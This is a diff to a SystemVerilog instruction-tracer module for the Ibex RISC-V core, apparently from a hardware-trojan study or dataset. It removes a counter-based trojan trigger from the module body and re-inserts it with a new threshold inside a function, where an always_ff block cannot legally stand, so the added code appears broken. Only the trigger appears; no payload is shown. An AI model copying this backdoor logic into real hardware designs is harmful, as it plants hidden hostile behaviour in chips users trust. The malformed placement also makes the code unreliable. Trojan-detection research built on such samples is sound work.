@@ -70,24 +70,6 @@ module ibex_tracer_trojan_DoS (
   input logic [15:0] rvfi_ext_expanded_insn
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15470;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (rvfi_valid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   // These signals are part of RVFI, but not used in this module currently.
   // Keep them as part of the interface to change the tracer more easily in the future. Assigning
   // these signals to unused_* signals marks them explicitly as unused, an annotation picked up by
@@ -853,6 +835,23 @@ module ibex_tracer_trojan_DoS (
     predecessor = get_fence_description(rvfi_insn[27:24]);
     successor = get_fence_description(rvfi_insn[23:20]);
     decoded_str = $sformatf("fence\t%s,%s", predecessor, successor);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=9954)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9954;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (rvfi_valid) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   endfunction
 
   // cycle counter
